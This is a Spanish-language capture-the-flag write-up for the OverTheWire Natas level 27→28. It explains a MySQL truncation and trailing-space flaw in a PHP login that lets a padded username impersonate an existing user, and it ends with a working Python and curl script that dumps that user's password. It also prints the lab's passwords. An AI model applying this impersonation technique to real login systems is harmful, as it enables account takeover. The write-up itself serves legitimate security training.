# Natas 27 → 28

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas27.natas.labs.overthewire.org |
| Usuario | natas27 |
| Contraseña | u3RRffXjysjgwFU6b9xa23i6prmUsYne |
| Contraseña obtenida | 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj |

---

## Reconocimiento

La página presenta un formulario de login. El código fuente revela una base de datos MySQL con una tabla `users` con columnas `username varchar(64)` y `password varchar(64)`.

---

## Análisis del código fuente

### `validUser($link, $usr)`

```php
function validUser($link,$usr){
    $user=mysqli_real_escape_string($link, $usr);
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```

Verifica si el usuario existe en la base de datos buscando el username exacto.

### `createUser($link, $usr, $pass)`

```php
function createUser($link, $usr, $pass){
    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    ...
}
```

1. `trim()` verifica que el username no empiece ni termine en espacio
2. `substr($usr, 0, 64)` trunca el username a 64 caracteres antes de insertar

### `dumpData($link, $usr)`

```php
function dumpData($link,$usr){
    $user=mysqli_real_escape_string($link, trim($usr));
    $query = "SELECT * from users where username='$user'";
    ...
}
```

Hace `trim()` al username antes de buscar — elimina espacios al final.

---

## Vulnerabilidad: SQL Truncation

### ¿Qué es `varchar(64)`?

Define que el campo acepta strings de hasta 64 caracteres. Si se inserta un string más largo, MySQL lo **trunca** al límite.

### ¿Por qué MySQL trata `natas28[espacios]` como `natas28`?

MySQL tiene **trailing space insensitivity** — al comparar strings con `=`, ignora los espacios al final:

```sql
SELECT * FROM users WHERE username='natas28'
-- encuentra tanto 'natas28' como 'natas28   '
```

### El ataque

1. `validUser("natas28[57 espacios]X")` → no encuentra ese username exacto → cree que no existe
2. `createUser()` → `trim()` pasa (no empieza/termina en espacio) → `substr()` trunca a 64 → MySQL inserta `natas28[57 espacios]`
3. Login con `natas28[57 espacios]` → `validUser()` lo encuentra (MySQL lo trata como `natas28`) → `checkCredentials()` verifica con tu contraseña
4. `dumpData()` hace `trim()` → busca `natas28` → MySQL devuelve el registro del usuario real con su contraseña

### ¿Por qué la X?

Sin la X, el username terminaría en espacio — `trim()` lo rechazaría con "Go away hacker". La X es solo para pasar esa validación. Al truncar a 64 caracteres, la X queda fuera.

---

## Explotación

```python
import subprocess, re

username_create = 'natas28' + ' '*57 + 'X'  # 65 chars, pasa trim(), se trunca a 64
username_login  = 'natas28' + ' '*57         # 64 chars exactos, MySQL lo trata como natas28

url  = 'http://natas27.natas.labs.overthewire.org/'
auth = 'natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne'

cmd1 = ['curl', '-s', '-X', 'POST', url, '-u', auth,
        '--data-urlencode', f'username={username_create}',
        '--data-urlencode', 'password=marco123']

cmd2 = ['curl', '-s', '-X', 'POST', url, '-u', auth,
        '--data-urlencode', f'username={username_login}',
        '--data-urlencode', 'password=marco123']

r1 = subprocess.run(cmd1, capture_output=True, text=True)
print('Paso 1:', 'created' if 'created' in r1.stdout else 'exists')

r2 = subprocess.run(cmd2, capture_output=True, text=True)
m = re.search(r'Welcome.*?viewsource', r2.stdout, re.DOTALL)
print('Paso 2:', m.group(0)[:500] if m else r2.stdout[400:700])
```

---

## Conceptos clave

- **SQL Truncation**: MySQL trunca strings que exceden el límite de `varchar`. Si el string truncado coincide con un usuario existente, se puede impersonar.
- **Trailing space insensitivity**: MySQL ignora espacios al final al comparar strings con `=`.
- **`varchar(64)`**: tipo de dato MySQL para strings de hasta 64 caracteres.
- **`trim()`**: elimina espacios al inicio y final de un string. En este nivel se usa para validar pero no para modificar el username antes de insertar.
- **`substr($str, 0, 64)`**: recorta el string a 64 caracteres. PHP lo trunca antes de enviarlo a MySQL.
